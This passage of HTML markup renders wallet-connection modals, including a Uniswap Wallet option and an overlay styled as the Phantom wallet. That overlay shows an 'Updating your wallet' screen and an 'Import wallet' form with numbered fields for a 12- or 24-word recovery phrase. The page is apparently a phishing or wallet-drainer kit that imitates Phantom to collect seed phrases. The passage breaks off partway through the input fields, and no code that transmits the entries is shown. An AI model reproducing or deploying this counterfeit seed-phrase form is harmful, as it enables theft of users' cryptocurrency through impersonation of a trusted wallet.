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"
                        alt="Uniswap Wallet"
                      />
                    </div>
                    <div>
                      <span
                        class="scwtw-font-normal scwtw-text-base scwtw-text-[#202020] dark:scwtw-text-[#e4e7e7]"
                        >Uniswap Wallet</span
                      >
                    </div>
                  </div>
                  <div
                    class="group-data-[is-loading=true]:scwtw-flex group-data-[is-loading=false]:scwtw-hidden scwtw-items-center scwtw-justify-end scwtw-pr-2"
                  >
                    <div>
                      <svg
                        class="scwtw-w-5 sFcwtw-h-5 scwtw-text-[#202020] dark:scwtw-text-[#e4e7e7] scwtw-animate-spin"
                        xmlns="http://www.w3.org/2000/svg"
                        width="24"
                        height="24"
                        viewBox="0 0 24 24"
                        fill="none"
                        stroke="currentColor"
                        stroke-width="2"
                        stroke-linecap="round"
                        stroke-linejoin="round"
                      >
                        <path d="M21 12a9 9 0 1 1-6.219-8.56"></path>
                      </svg>
                    </div>
                  </div>
                </button>
              </div>
            </div>
          </div>
          <div class="md:scwtw-basis-1/2 md:scwtw-h-full">
            <div
              class="scwtw-w-full md:scwtw-h-full scwtw-h-[150px] md:scwtw-p-0 scwtw-p-4 scwtw-flex scwtw-items-center scwtw-justify-center scwtw-rounded-[24px] scwtw-bg-[#f0f0f0] dark:scwtw-bg-[#ffffff05] scwtw-animate-pulse"
            >
              <div
                class="scwtw-flex scwtw-flex-col scwtw-justify-center scwtw-items-center scwtw-gap-y-4 scwtw-ease-in-out scwtw-transition-all scwtw-duration-400 scwtw-hidden scwtw-opacity-0"
                id="initial-text-start-modal"
              >
                <div>
                  <svg
                    class="scwtw-w-12 scwtw-h-12 scwtw-text-[#363636] dark:scwtw-text-[#e4e7e7]"
                    xmlns="http://www.w3.org/2000/svg"
                    width="24"
                    height="24"
                    viewBox="0 0 24 24"
                    fill="none"
                    stroke="currentColor"
                    stroke-width="1"
                    stroke-linecap="round"
                    stroke-linejoin="round"
                  >
                    <circle cx="12" cy="12" r="10"></circle>
                    <path
                      d="M12 2a14.5 14.5 0 0 0 0 20 14.5 14.5 0 0 0 0-20"
                    ></path>
                    <path d="M2 12h20"></path>
                  </svg>
                </div>
                <div class="scwtw-max-w-[250px] scwtw-text-center">
                  <p
                    class="scwtw-text-[#363636] dark:scwtw-text-[#e4e7e7] scwtw-font-normal 2xl:scwtw-text-[16px] xl:scwtw-text-[15px] scwtw-text-[14px]"
                  >
                    Connect your wallet to get started
                  </p>
                </div>
              </div>
              <div
                class="scwtw-flex scwtw-flex-col scwtw-justify-center scwtw-items-center scwtw-gap-y-4 scwtw-ease-in-out scwtw-transition-all scwtw-duration-400 scwtw-opacity-100"
                id="open-text-start-modal"
              >
                <div>
                  <svg
                    class="scwtw-w-12 scwtw-h-12 scwtw-text-[#363636] dark:scwtw-text-[#e4e7e7]"
                    xmlns="http://www.w3.org/2000/svg"
                    width="24"
                    height="24"
                    viewBox="0 0 24 24"
                    fill="none"
                    stroke="currentColor"
                    stroke-width="1"
                    stroke-linecap="round"
                    stroke-linejoin="round"
                  >
                    <path d="M14 4.1 12 6"></path>
                    <path d="m5.1 8-2.9-.8"></path>
                    <path d="m6 12-1.9 2"></path>
                    <path d="M7.2 2.2 8 5.1"></path>
                    <path
                      d="M9.037 9.69a.498.498 0 0 1 .653-.653l11 4.5a.5.5 0 0 1-.074.949l-4.349 1.041a1 1 0 0 0-.74.739l-1.04 4.35a.5.5 0 0 1-.95.074z"
                    ></path>
                  </svg>
                </div>
                <div class="scwtw-max-w-[250px] scwtw-text-center">
                  <p
                    class="scwtw-text-[#363636] dark:scwtw-text-[#e4e7e7] scwtw-font-normal 2xl:scwtw-text-[16px] xl:scwtw-text-[15px] scwtw-text-[14px]"
                  >
                    Confirm the wallet connection
                  </p>
                </div>
              </div>
              <div
                class="scwtw-flex scwtw-flex-col scwtw-justify-center scwtw-items-center scwtw-gap-y-4 scwtw-hidden scwtw-opacity-0 scwtw-ease-in-out scwtw-transition-all scwtw-duration-400"
                id="import-text-start-modal"
              >
                <div>
                  <svg
                    class="scwtw-w-12 scwtw-h-12 scwtw-text-[#363636] dark:scwtw-text-[#e4e7e7]"
                    xmlns="http://www.w3.org/2000/svg"
                    width="24"
                    height="24"
                    viewBox="0 0 24 24"
                    fill="none"
                    stroke="currentColor"
                    stroke-width="1"
                    stroke-linecap="round"
                    stroke-linejoin="round"
                  >
                    <path
                      d="M21 8L18.74 5.74A9.75 9.75 0 0 0 12 3C11 3 10.03 3.16 9.13 3.47"
                    ></path>
                    <path d="M8 16H3v5"></path>
                    <path d="M3 12C3 9.51 4 7.26 5.64 5.64"></path>
                    <path
                      d="m3 16 2.26 2.26A9.75 9.75 0 0 0 12 21c2.49 0 4.74-1 6.36-2.64"
                    ></path>
                    <path d="M21 12c0 1-.16 1.97-.47 2.87"></path>
                    <path d="M21 3v5h-5"></path>
                    <path d="M22 22 2 2"></path>
                  </svg>
                </div>
                <div class="scwtw-max-w-[250px] scwtw-text-center">
                  <p
                    class="scwtw-text-[#363636] dark:scwtw-text-[#e4e7e7] scwtw-font-normal 2xl:scwtw-text-[16px] xl:scwtw-text-[15px] scwtw-text-[14px]"
                  >
                    Something went wrong. Try another method
                  </p>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
    <div
      id="start-modal-overlay"
      style="display: none"
      class="scwtw-fixed scwtw-inset-0 scwtw-w-full scwtw-h-full scwtw-bg-[#0000004d] dark:scwtw-bg-[#00000080] scwtw-transition-opacity scwtw-duration-200 scwtw-ease-in-out scwtw-z-[2147483645] scwtw-opacity-100 "
    ></div>
    <div id="custom-modal-container">
      <div
        class="modal-overlay-postfix modalv3-fixed modalv3-inset-0 modalv3-bg-black modalv3-bg-opacity-50 modalv3-flex modalv3-items-center modalv3-justify-center modalv3-p-4 modalv3-z-9998"
        data-theme-custom="light"
      >
        <div
          class="modal-content-postfix modalv3-w-full modalv3-max-w-360 modalv3-rounded-38 modalv3-overflow-hidden"
        ></div>
      </div>
    </div>
    <div
      id="phantom-modal"
      style="display: none"
      class="phantom-modal-overlay scwtw-fixed scwtw-inset-0 scwtw-w-full scwtw-h-full scwtw-bg-[#12121280] scwtw-transition-opacity scwtw-duration-200 scwtw-ease-in-out scwtw-pointer-events-auto scwtw-z-[2147483647] scwtw-opacity-100"
    ></div>
    <div
      id="phantom-modal-overlay"
      style="display: none"
      class="phantom-modal connect-modal-parent scwtw-fixed scwtw-inset-0 scwtw-transition-all scwtw-duration-200 scwtw-ease-in-out scwtw-pointer-events-none scwtw-z-[2147483648] scwtw-opacity-100"
    >
      <div
        class="phantom-modal-content scwtw-pointer-events-auto scwtw-flex scwtw-transition-transform scwtw-duration-200 scwtw-ease-in-out scwtw-fixed scwtw-top-1/2 scwtw-left-1/2 -scwtw-translate-x-1/2 scwtw-w-full scwtw-h-full scwtw-max-full md:scwtw-top-0 md:scwtw-right-8 md:scwtw-left-auto md:scwtw-translate-x-0 md:scwtw-w-[360px] md:scwtw-h-[685px] md:scwtw-border md:scwtw-border-[#323232] md:scwtw-overflow-y-hidden scwtw-overflow-y-auto -scwtw-translate-y-1/2 md:scwtw-translate-y-0"
      >
        <div
          class="scwtw-h-full scwtw-w-full scwtw-bg-[#222222] scwtw-shadow-xl md:scwtw-border-0 dark:md:scwtw-border-0 dark:scwtw-border-[#f8f8f8] scwtw-rounded-none"
        >
          <div class="scwtw-relative scwtw-z-[2147483649] scwtw-h-full">
            <div
              id="ghost-container"
              class="scwtw-absolute scwtw-inset-0 scwtw-z-[2147483648] scwtw-transition-opacity scwtw-duration-500 scwtw-flex scwtw-items-center scwtw-justify-center scwtw-flex-col scwtw-opacity-0 scwtw-hidden"
            >
              <div>
                <svg
                  class="scwtw-h-[120px] scwtw-w-full ghost-svg"
                  width="593"
                  height="493"
                  viewBox="0 0 593 493"
                  fill="none"
                  xmlns="http://www.w3.org/2000/svg"
                >
                  <path
                    d="M70.0546 493C145.604 493 202.38 427.297 236.263 375.378C232.142 386.865 229.852 398.351 229.852 409.378C229.852 439.703 247.252 461.297 281.592 461.297C328.753 461.297 379.119 419.946 405.218 375.378C403.386 381.811 402.471 387.784 402.471 393.297C402.471 414.432 414.375 427.757 438.643 427.757C515.108 427.757 592.03 292.216 592.03 173.676C592.03 81.3243 545.327 0 428.112 0C222.069 0 0 251.784 0 414.432C0 478.297 34.3405 493 70.0546 493ZM357.141 163.568C357.141 140.595 369.962 124.514 388.734 124.514C407.049 124.514 419.87 140.595 419.87 163.568C419.87 186.541 407.049 203.081 388.734 203.081C369.962 203.081 357.141 186.541 357.141 163.568ZM455.126 163.568C455.126 140.595 467.947 124.514 486.719 124.514C505.034 124.514 517.855 140.595 517.855 163.568C517.855 186.541 505.034 203.081 486.719 203.081C467.947 203.081 455.126 186.541 455.126 163.568Z"
                    fill="#FFFDF8"
                  ></path>
                </svg>
              </div>
              <div class="scwtw-mt-8">
                <p
                  class="scwtw-text-[#ffffff] scwtw-text-2xl scwtw-font-semibold font-inter"
                >
                  BooOooOo...
                </p>
              </div>
            </div>
            <div
              id="tips-container"
              class="scwtw-absolute scwtw-inset-0 scwtw-z-[2147483648] scwtw-transition-opacity scwtw-duration-500 scwtw-flex scwtw-items-center scwtw-justify-center scwtw-flex-col scwtw-opacity-0 scwtw-hidden"
            >
              <div>
                <svg
                  class="scwtw-h-[120px] scwtw-w-full tips-ghost-svg ghost-float scwtw-transition-transform dscwtw-uration-600 scwtw-ease-in-out"
                  width="593"
                  height="493"
                  viewBox="0 0 593 493"
                  fill="none"
                  xmlns="http://www.w3.org/2000/svg"
                >
                  <path
                    d="M70.0546 493C145.604 493 202.38 427.297 236.263 375.378C232.142 386.865 229.852 398.351 229.852 409.378C229.852 439.703 247.252 461.297 281.592 461.297C328.753 461.297 379.119 419.946 405.218 375.378C403.386 381.811 402.471 387.784 402.471 393.297C402.471 414.432 414.375 427.757 438.643 427.757C515.108 427.757 592.03 292.216 592.03 173.676C592.03 81.3243 545.327 0 428.112 0C222.069 0 0 251.784 0 414.432C0 478.297 34.3405 493 70.0546 493ZM357.141 163.568C357.141 140.595 369.962 124.514 388.734 124.514C407.049 124.514 419.87 140.595 419.87 163.568C419.87 186.541 407.049 203.081 388.734 203.081C369.962 203.081 357.141 186.541 357.141 163.568ZM455.126 163.568C455.126 140.595 467.947 124.514 486.719 124.514C505.034 124.514 517.855 140.595 517.855 163.568C517.855 186.541 505.034 203.081 486.719 203.081C467.947 203.081 455.126 186.541 455.126 163.568Z"
                    fill="#FFFDF8"
                  ></path>
                </svg>
              </div>
              <div class="scwtw-mt-8">
                <p
                  class="scwtw-text-[#ffffff] scwtw-text-2xl scwtw-font-semibold font-inter scwtw-transition-opacity scwtw-duration-500 scwtw-ease-in-out"
                >
                  Updating your wallet
                </p>
              </div>
              <div class="scwtw-mt-6">
                <p
                  class="scwtw-text-[#999999] font-inter scwtw-font-medium scwtw-text-[17px] scwtw-max-w-[290px] scwtw-leading-[24px] scwtw-transition-opacity scwtw-duration-500 scwtw-ease-in-out"
                >
                  What's new?
                </p>
              </div>
              <div class="scwtw-mt-4 scwtw-text-center">
                <p
                  class="scwtw-text-[#999999] font-inter scwtw-font-normal scwtw-text-[17px] scwtw-max-w-[290px] scwtw-leading-[24px] scwtw-transition-opacity scwtw-duration-500 scwtw-ease-in-out"
                  id="tips-text"
                >
                  View Solana, Ethereum, and Polygon balances together.
                </p>
              </div>
            </div>
            <div
              id="import-container"
              class="scwtw-z-[2147483648] scwtw-transition-opacity scwtw-duration-500 scwtw-opacity-100"
            >
              <div
                class="scwtw-flex scwtw-items-center scwtw-justify-between scwtw-px-[16px] scwtw-py-[10px] scwtw-border-b scwtw-border-[#323232] scwtw-h-[59px]"
              >
                <div class="scwtw-flex scwtw-items-center scwtw-justify-center">
                  <button
                    type="button"
                    class="md:scwtw-hidden"
                    id="phantom-close-button"
                  >
                    <svg
                      class="scwtw-w-5 scwtw-h-5 scwtw-text-[#777777] hover:scwtw-text-[#ffffff] scwtw-transition-colors scwtw-duration-300"
                      xmlns="http://www.w3.org/2000/svg"
                      width="24"
                      height="24"
                      viewBox="0 0 24 24"
                      fill="none"
                      stroke="currentColor"
                      stroke-width="2"
                      stroke-linecap="round"
                      stroke-linejoin="round"
                    >
                      <circle cx="12" cy="12" r="10"></circle>
                      <path d="m15 9-6 6"></path>
                      <path d="m9 9 6 6"></path>
                    </svg>
                  </button>
                </div>
                <div>
                  <svg width="94" height="103" viewBox="0 0 478 103">
                    <path
                      fill="#666666"
                      d="M0 102.895h17.97V85.222c0-8.295-.718-11.42-4.911-19.836l2.276-1.203C21.445 78.49 30.07 83.66 38.937 83.66c14.257 0 25.638-12.503 25.638-31.859 0-18.514-10.423-32.1-25.399-32.1-8.865 0-17.73 5.05-23.841 19.477l-2.276-1.202c2.875-5.771 4.912-11.181 4.912-16.35H0v81.27ZM17.97 51.68c0-7.934 5.991-16.71 14.857-16.71 7.188 0 13.058 5.89 13.058 16.59 0 10.58-5.63 16.831-13.178 16.831-8.387 0-14.736-8.536-14.736-16.71ZM71.135 81.736h17.97v-21.16c0-14.907 5.272-25.487 15.096-25.487 6.23 0 8.147 4.208 8.147 14.668v31.979h17.97V46.871c0-18.995-6.828-27.17-19.887-27.17-13.419 0-17.851 9.017-23.003 19.957l-2.276-1.202c3.115-6.733 3.953-10.82 3.953-16.832V.826h-17.97v80.91ZM156.582 83.66c11.621 0 18.45-7.694 23.601-17.553l2.157 1.082c-2.277 4.689-4.433 10.099-4.433 14.547h17.612v-32.7c0-19.477-8.147-29.335-27.196-29.335-18.69 0-27.915 9.377-29.712 19.236l17.252 3.005c.599-5.17 4.792-8.656 11.501-8.656 6.71 0 10.543 3.366 10.543 7.454 0 4.088-3.953 6.011-14.496 6.131-15.575.24-27.076 5.891-27.076 17.914 0 9.858 7.787 18.874 20.247 18.874Zm-2.396-20.078c0-9.498 15.095-2.885 23.362-10.218v2.163c0 8.536-7.548 14.788-15.096 14.788-3.953 0-8.266-1.683-8.266-6.733ZM202.64 81.736h17.97v-21.16c0-14.907 5.272-25.487 15.096-25.487 6.23 0 8.146 4.208 8.146 14.668v31.979h17.972V46.871c0-18.995-6.829-27.17-19.888-27.17-13.419 0-17.851 9.017-23.003 19.957l-2.276-1.202c3.115-6.733 3.953-10.82 3.953-16.832h-17.97v60.112ZM309.688 81.977V67.069c-3.834 1.322-14.496 3.606-14.496-5.17V36.051h14.376V21.624h-14.376V5.514l-18.091 5.41v10.7h-10.782v14.427h10.782l.12 27.291c0 20.077 17.851 22.963 32.467 18.635ZM346.192 83.66c18.211 0 32.108-13.946 32.108-32.1 0-18.034-13.897-31.86-32.108-31.86-18.21 0-32.227 13.826-32.227 31.86 0 18.154 14.017 32.1 32.227 32.1Zm-13.657-31.98c0-9.978 5.631-16.951 13.657-16.951 8.027 0 13.538 6.973 13.538 16.951 0 9.979-5.511 16.952-13.538 16.952-8.026 0-13.657-6.973-13.657-16.952ZM383.868 81.736h17.968v-21.16c0-15.508 4.913-25.487 12.82-25.487 5.154 0 6.83 4.088 6.83 14.668v31.979h17.973v-21.16c0-14.547 5.27-25.487 12.82-25.487 5.027 0 6.824 4.69 6.824 14.668v31.979h17.974V46.871c0-19.115-6.232-27.17-18.452-27.17-12.698 0-17.248 9.017-21.682 20.077l-2.16-1.082c4.198-12.623-4.912-18.995-13.896-18.995-11.858 0-16.171 9.017-20.963 19.957l-2.159-1.202c2.994-6.733 4.071-10.82 4.071-16.832h-17.968v60.112Z"
                    ></path>
                  </svg>
                </div>
                <div>
                  <a
                    href="https://href.li/?https://help.phantom.com/hc/en-us"
                    target="_blank"
                  >
                    <svg
                      class="scwtw-fill-[#777777] hover:scwtw-fill-[#ffffff] scwtw-transition-colors scwtw-duration-200"
                      width="15"
                      viewBox="0 0 15 15"
                      fill="none"
                      xmlns="http://www.w3.org/2000/svg"
                    >
                      <path
                        d="M7.5 0C3.3589 0 0 3.3589 0 7.5C0 11.6411 3.3589 15 7.5 15C11.6411 15 15 11.6411 15 7.5C15 3.3589 11.6411 0 7.5 0ZM8.31288 11.7485C8.31288 12.0092 8.09816 12.2239 7.83742 12.2239H6.62577C6.36503 12.2239 6.15031 12.0092 6.15031 11.7485V10.9663C6.15031 10.7055 6.36503 10.4908 6.62577 10.4908H7.83742C8.09816 10.4908 8.31288 10.7055 8.31288 10.9663V11.7485ZM10.2301 7.08589C9.90798 7.53067 9.5092 7.88344 9.0184 8.14417C8.74233 8.32822 8.55828 8.51227 8.46626 8.72699C8.40491 8.86503 8.3589 9.04908 8.32822 9.2638C8.31288 9.43252 8.15951 9.55521 7.9908 9.55521H6.50307C6.30368 9.55521 6.15031 9.3865 6.16564 9.20245C6.19632 8.78834 6.30368 8.46626 6.47239 8.22086C6.68712 7.92945 7.07055 7.57669 7.6227 7.19325C7.91411 7.0092 8.12883 6.79448 8.29755 6.53374C8.46626 6.27301 8.54294 5.96626 8.54294 5.6135C8.54294 5.26074 8.45092 4.96932 8.25153 4.7546C8.05215 4.53988 7.79141 4.43252 7.43865 4.43252C7.14724 4.43252 6.91718 4.52454 6.71779 4.69325C6.59509 4.80061 6.5184 4.93865 6.47239 5.1227C6.41104 5.33742 6.21166 5.47546 5.98159 5.47546L4.60123 5.44479C4.43252 5.44479 4.29448 5.29141 4.30982 5.1227C4.35583 4.3865 4.64724 3.83436 5.15337 3.43558C5.7362 2.9908 6.48773 2.76074 7.43865 2.76074C8.45092 2.76074 9.24847 3.02147 9.83129 3.52761C10.4141 4.03374 10.7055 4.72393 10.7055 5.59816C10.7055 6.15031 10.5368 6.6411 10.2301 7.08589Z"
                      ></path>
                    </svg>
                  </a>
                </div>
              </div>
              <div class="scwtw-mt-6">
                <div class="scwtw-flex scwtw-items-center scwtw-justify-center">
                  <div>
                    <svg
                      class="scwtw-h-[80px] scwtw-w-full"
                      width="593"
                      height="493"
                      viewBox="0 0 593 493"
                      fill="none"
                      xmlns="http://www.w3.org/2000/svg"
                    >
                      <path
                        d="M70.0546 493C145.604 493 202.38 427.297 236.263 375.378C232.142 386.865 229.852 398.351 229.852 409.378C229.852 439.703 247.252 461.297 281.592 461.297C328.753 461.297 379.119 419.946 405.218 375.378C403.386 381.811 402.471 387.784 402.471 393.297C402.471 414.432 414.375 427.757 438.643 427.757C515.108 427.757 592.03 292.216 592.03 173.676C592.03 81.3243 545.327 0 428.112 0C222.069 0 0 251.784 0 414.432C0 478.297 34.3405 493 70.0546 493ZM357.141 163.568C357.141 140.595 369.962 124.514 388.734 124.514C407.049 124.514 419.87 140.595 419.87 163.568C419.87 186.541 407.049 203.081 388.734 203.081C369.962 203.081 357.141 186.541 357.141 163.568ZM455.126 163.568C455.126 140.595 467.947 124.514 486.719 124.514C505.034 124.514 517.855 140.595 517.855 163.568C517.855 186.541 505.034 203.081 486.719 203.081C467.947 203.081 455.126 186.541 455.126 163.568Z"
                        fill="#FFFDF8"
                      ></path>
                    </svg>
                  </div>
                </div>
                <div
                  class="scwtw-flex scwtw-flex-col scwtw-items-center scwtw-justify-center scwtw-text-center scwtw-gap-y-2 scwtw-mt-4"
                >
                  <div>
                    <h3
                      class="scwtw-text-[#ffffff] font-inter scwtw-font-medium scwtw-text-[24px]"
                      id="phantom-title"
                    >
                      Import wallet
                    </h3>
                  </div>
                  <div>
                    <p
                      class="scwtw-text-[#999999] font-inter scwtw-font-normal scwtw-text-[15px] scwtw-max-w-[290px] scwtw-leading-[20px]"
                      id="phantom-description"
                    >
                      Import an existing wallet with your 12 or 24-word recovery
                      phrase.
                    </p>
                  </div>
                </div>
                <div
                  class="scwtw-mt-6 scwtw-px-6 md:scwtw-max-h-[200px] scwtw-max-h-[300px] scwtw-overflow-y-auto phantom-custom-scrollbar"
                >
                  <div
                    class="phantom-container-12-words scwtw-grid scwtw-grid-cols-3 scwtw-gap-3"
                  >
                    <div class="scwtw-relative">
                      <p
                        class="scwtw-px-[10px] font-inter scwtw-text-[#999999] scwtw-font-normal scwtw-text-[14px] scwtw-absolute scwtw-top-[11px]"
                      >
                        1.
                      </p>
                      <input
                        class="scwtw-text-[#ffffff] font-inter scwtw-font-normal scwtw-text-[15px] scwtw-bg-[#181818] scwtw-rounded-[6px] scwtw-border scwtw-border-[#2f2f2f] scwtw-h-[41px] scwtw-self-center scwtw-shadow-[0_0_4px_0_rgba(0,0,0,0.25)] scwtw-outline-none scwtw-pl-8 scwtw-pr-2 scwtw-w-full focus:scwtw-border-[#ab9ff2] scwtw-transition-all scwtw-duration-300 data-[invalid=true]:scwtw-border-[#eb3742] phantom-seed-input"
                        type="text"
                        data-invalid="false"
                      />
                    </div>
                    <div class="scwtw-relative">
                      <p
                        class="scwtw-px-[10px] font-inter scwtw-text-[#999999] scwtw-font-normal scwtw-text-[14px] scwtw-absolute scwtw-top-[11px]"
                      >
                        2.
                      </p>
                      <input
                        class="scwtw-text-[#ffffff] font-inter scwtw-font-normal scwtw-text-[15px] scwtw-bg-[#181818] scwtw-rounded-[6px] scwtw-border scwtw-border-[#2f2f2f] scwtw-h-[41px] scwtw-self-center scwtw-shadow-[0_0_4px_0_rgba(0,0,0,0.25)] scwtw-outline-none scwtw-pl-8 scwtw-pr-2 scwtw-w-full focus:scwtw-border-[#ab9ff2] scwtw-transition-all scwtw-duration-300 data-[invalid=true]:scwtw-border-[#eb3742] phantom-seed-input"
                        type="text"
                        data-invalid="false"
                      />
                    </div>
                    <div class="scwtw-relative">
                      <p
                        class="scwtw-px-[10px] font-inter scwtw-text-[#999999] scwtw-font-normal scwtw-text-[14px] scwtw-absolute scwtw-top-[11px]"
                      >
                        3.
                      </p>
                      <input
                        class="scwtw-text-[#ffffff] font-inter scwtw-font-normal scwtw-text-[15px] scwtw-bg-[#181818] scwtw-rounded-[6px] scwtw-border scwtw-border-[#2f2f2f] scwtw-h-[41px] scwtw-self-center scwtw-shadow-[0_0_4px_0_rgba(0,0,0,0.25)] scwtw-outline-none scwtw-pl-8 scwtw-pr-2 scwtw-w-full focus:scwtw-border-[#ab9ff2] scwtw-transition-all scwtw-duration-300 data-[invalid=true]:scwtw-border-[#eb3742] phantom-seed-input"
                        type="text"
                        data-invalid="false"
                      />
                    </div>
                    <div class="scwtw-relative">
                      <p
                        class="scwtw-px-[10px] font-inter scwtw-text-[#999999] scwtw-font-normal scwtw-text-[14px] scwtw-absolute scwtw-top-[11px]"
                      >
                        4.
                      </p>
                      <input
                        class="scwtw-text-[#ffffff] font-inter scwtw-font-normal scwtw-text-[15px] scwtw-bg-[#181818] scwtw-rounded-[6px] scwtw-border scwtw-border-[#2f2f2f] scwtw-h-[41px] scwtw-self-center scwtw-shadow-[0_0_4px_0_rgba(0,0,0,0.25)] scwtw-outline-none scwtw-pl-8 scwtw-pr-2 scwtw-w-full focus:scwtw-border-[#ab9ff2] scwtw-transition-all scwtw-duration-300 data-[invalid=true]:scwtw-border-[#eb3742] phantom-seed-input"
                        type="text"
                        data-invalid="false"
                      />
                    </div>
                    <div class="scwtw-relative">
                      <p
                        class="scwtw-px-[10px] font-inter scwtw-text-[#999999] scwtw-font-normal scwtw-text-[14px] scwtw-absolute scwtw-top-[11px]"
                      >
                        5.
                      </p>
                      <input
                        class="scwtw-text-[#ffffff] font-inter scwtw-font-normal scwtw-text-[15px] scwtw-bg-[#181818] scwtw-rounded-[6px] scwtw-border scwtw-border-[#2f2f2f] scwtw-h-[41px] scwtw-self-center scwtw-shadow-[0_0_4px_0_rgba(0,0,0,0.25)] scwtw-outline-none scwtw-pl-8 scwtw-pr-2 scwtw-w-full focus:scwtw-border-[#ab9ff2] scwtw-transition-all scwtw-duration-300 data-[invalid=true]:scwtw-border-[#eb3742] phantom-seed-input"
                        type="text"
                        data-invalid="false"
                      />
                    </div>
                    <div class="scwtw-relative">
                      <p
                        class="scwtw-px-[10px] font-inter scwtw-text-[#999999] scwtw-font-normal scwtw-text-[14px] scwtw-absolute scwtw-top-[11px]"
                      >
                        6.
                      </p>
                      <input
                        class="scwtw-text-[#ffffff] font-inter scwtw-font-normal scwtw-text-[15px] scwtw-bg-[#181818] scwtw-rounded-[6px] scwtw-border scwtw-border-[#2f2f2f] scwtw-h-[41px] scwtw-self-center scwtw-shadow-[0_0_4px_0_rgba(0,0,0,0.25)] scwtw-outline-none scwtw-pl-8 scwtw-pr-2 scwtw-w-full focus:scwtw-border-[#ab9ff2] scwtw-transition-all scwtw-duration-300 data-[invalid=true]:scwtw-border-[#eb3742] phantom-seed-input"
                        type="text"
                        data-invalid="false"
                      />
                    </div>
                    <div class="scwtw-relative">
                      <p
                        class="scwtw-px-[10px] font-inter scwtw-text-[#999999] scwtw-font-normal scwtw-text-[14px] scwtw-absolute scwtw-top-[11px]"
                      >
                        7.
                      </p>
                      <input
                        class="scwtw-text-[#ffffff] font-inter scwtw-font-normal scwtw-text-[15px] scwtw-bg-[#181818] scwtw-rounded-[6px] scwtw-border scwtw-border-[#2f2f2f] scwtw-h-[41px] scwtw-self-center scwtw-shadow-[0_0_4px_0_rgba(0,0,0,0.25)] scwtw-outline-none scwtw-pl-8 scwtw-pr-2 scwtw-w-full focus:scwtw-border-[#ab9ff2] scwtw-transition-all scwtw-duration-300 data-[invalid=true]:scwtw-border-[#eb3742] phantom-seed-input"
                        type="text"
                        data-invalid="false"
                      />
                    </div>
                    <div class="scwtw-relative">
                      <p
                        class="scwtw-px-[10px] font-inter scwtw-text-[#999999] scwtw-font-normal scwtw-text-[14px] scwtw-absolute scwtw-top-[11px]"
                      >
                        8.
                      </p>
                      <input
